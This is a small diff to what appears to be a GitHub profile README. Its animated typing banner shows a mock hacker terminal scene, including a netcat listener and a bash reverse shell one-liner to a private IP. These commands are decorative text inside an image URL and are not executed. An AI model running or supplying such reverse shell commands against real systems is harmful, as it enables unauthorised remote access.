@@ -2,7 +2,7 @@
 
 <img align="right" width="330" src="https://media.giphy.com/media/v1.Y2lkPWVjZjA1ZTQ3bDFoeTM2ZHY0YzY1aXZyeDVqeWlqMTUyZTlweHM0d2NqcHV5Z3VjZCZlcD12MV9naWZzX3NlYXJjaCZjdD1n/ToMjGplujsIS6kHzUPK/giphy.gif" alt="coding">
 
-<a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&duration=2700&pause=100&color=0034ff&multiline=true&width=500&height=350&lines=nc+-lvnp+4444;listening+on+%5Bany%5D+4444+...;connect+to+%5BXolboyev%5D++profile+;bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.44.38%2F4444+0%3E%261;Xolboyev%40profile%3A~%24+.%2Fexploit.py;+;...................PwN3d!......................................;Hello+Stranger!+Xolboyev+is+serving+here...;...............................................................;++;%24+whoami;Xolboyev" alt="Typing SVG" /></a>
+<a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&duration=2700&pause=100&color=0034ff&multiline=true&width=500&height=350&lines=nc+-lvnp+4444;listening+on+%5Bany%5D+4444+...;connect+to+%5BXolboyev%5D++profile+;bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.44.38%2F4444+0%3E%261;Xolboyev%40profile%3A~%24+.%2Fexploit.py;+;...................PwN3d!......................................;+Hello+Stranger!+Xolboyev+is+serving+here...;...............................................................;++;%24+whoami;Xolboyev" alt="Typing SVG" /></a>
 
 <p align="left">
   <img src="https://komarev.com/ghpvc/?username=rXolboyev&label=Profile%20views&color=0e75b6&style=flat" alt="xolboyev" />
